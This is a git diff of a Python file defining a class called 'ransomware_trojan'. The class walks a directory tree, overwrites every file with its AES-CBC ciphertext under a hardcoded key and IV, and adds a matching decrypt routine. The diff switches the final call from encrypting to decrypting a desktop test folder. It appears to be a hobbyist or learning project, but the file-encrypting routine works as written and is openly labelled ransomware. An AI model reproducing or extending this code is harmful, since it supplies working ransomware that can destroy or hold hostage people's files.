@@ -28,6 +28,7 @@ def generate_iv():
     print(iv)
     return iv   
 fixed_iv = "JAH3rdHjwKfO730X0vwWoA==" #generate_iv() 
+fixed_iv = base64.b64decode(fixed_iv)  # Decode Base64 to bytes
 
 iv_mapping = {}
 class ransomware_trojan:
@@ -36,13 +37,13 @@ class ransomware_trojan:
         self.iv = "JAH3rdHjwKfO730X0vwWoA=="
 
     def encrypt(self, data):
-        cipher = AES.new(key, AES.MODE_CBC)
+        cipher = AES.new(key, AES.MODE_CBC, fixed_iv)
         ct_bytes = cipher.encrypt(pad(data, AES.block_size))
-        iv = b64encode(cipher.iv).decode('utf-8')
-        print(iv)
-        ct = b64encode(ct_bytes).decode('utf-8')
-        result = json.dumps({'iv':iv, 'ciphertext': ct})
-        iv_mapping.update({'iv':iv, 'ciphertext': ct})
+        # iv = b64encode(cipher.iv).decode('utf-8')
+        # print(iv)
+        # ct = b64encode(ct_bytes).decode('utf-8')
+        # result = json.dumps({'iv':iv, 'ciphertext': ct})
+        # iv_mapping.update({'iv':iv, 'ciphertext': ct})
         return ct_bytes
     
     def read_file(self, path):
@@ -61,10 +62,10 @@ class ransomware_trojan:
         encrpyted_file_contant = self.encrypt(file_contant)
         self.write_file(file_path ,encrpyted_file_contant)
 
-    # def dcrypt_file(self, file_path):
-    #     file_contant = self.read_file(file_path)
-    #     encrpyted_file_contant = self.decrypt()
-    #     self.write_file(file_path ,encrpyted_file_contant)
+    def decrypt_file(self, file_path):
+        file_contant = self.read_file(file_path)
+        encrpyted_file_contant = self.decrypt(file_contant)
+        self.write_file(file_path ,encrpyted_file_contant)
 
     def iterating(self, target_path, function):
         for subdir, dirs, files in os.walk(target_path):
@@ -74,35 +75,38 @@ class ransomware_trojan:
                 function(file_path)
 
                 
-                
+    def decrypt(self, ct_bytes):
+        cipher = AES.new(self.key, AES.MODE_CBC, fixed_iv)
+        decrypted = unpad(cipher.decrypt(ct_bytes), AES.block_size)
+        return decrypted # Convert bytes back to string
+    #def decrypt(self):
+      #  pass
+        # try:
+        #     with open("iv_mapping.json", 'w') as file:
+        #         json.dump(iv_mapping, file, indent=4)
+        #     b64 = json.loads(json_text)
+        #     iv = b64decode(b64['iv'])
+        #     ct = b64decode(b64['ciphertext'])
+        #     cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        #     pt = unpad(cipher.decrypt(ct), AES.block_size)
+        #     result = pt.decode("ascii")
+        #     self.write_file(result)
+        #     return result
+        # except(ValueError, KeyError):
+        #     print("Incorrect decryption")
 
-
-    def decrypt(self, key, json_text):
-        try:
-            with open("iv_mapping.json", 'w') as file:
-                json.dump(iv_mapping, file, indent=4)
-            b64 = json.loads(json_text)
-            iv = b64decode(b64['iv'])
-            ct = b64decode(b64['ciphertext'])
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            pt = unpad(cipher.decrypt(ct), AES.block_size)
-            result = pt.decode("ascii")
-            self.write_file(result)
-            return result
-        except(ValueError, KeyError):
-            print("Incorrect decryption")
-
-    # cipher = AES.new(Key, AES.MODE_EAX, nonce= nonce)
-    # plain_text = cipher.decrypt(cipher_text)
-    # try:
-    #     cipher.verify(tag)
-    #     return plain_text.decode("ascii")
-    # except:
-    #     return False
+    #    cipher = AES.new(Key, AES.MODE_EAX, nonce= nonce)
+    #     plain_text = cipher.decrypt(cipher_text)
+    #     try:
+    #         cipher.verify(tag)
+    #         return plain_text.decode("ascii")
+    #     except:
+    #         return False
 
 trojan = ransomware_trojan(key)
 #print(trojan.decrypt(key, encrypted_text, ))
 #print(trojan.iterating(r"C:\Users\user1\Desktop\encrypt me"))
 #trojan.attack(r"C:\Users\user1\Desktop\encrypt me", trojan.encrypt())
 #print(decrypt(fixed_nonce, b'\xbb \x17\x11\xd5', b'\xa6\xd4\xdf\xdd[\x9e\xd5\xdft\xa0\x1eD\xb7\xffxE'))
-trojan.iterating(r"C:\Users\user1\Desktop\encrypt me", trojan.encrypt_file)
+trojan.iterating(r"C:\Users\user1\Desktop\encrypt me", trojan.decrypt_file)
+#trojan.decrypt("hellgokeopgk")
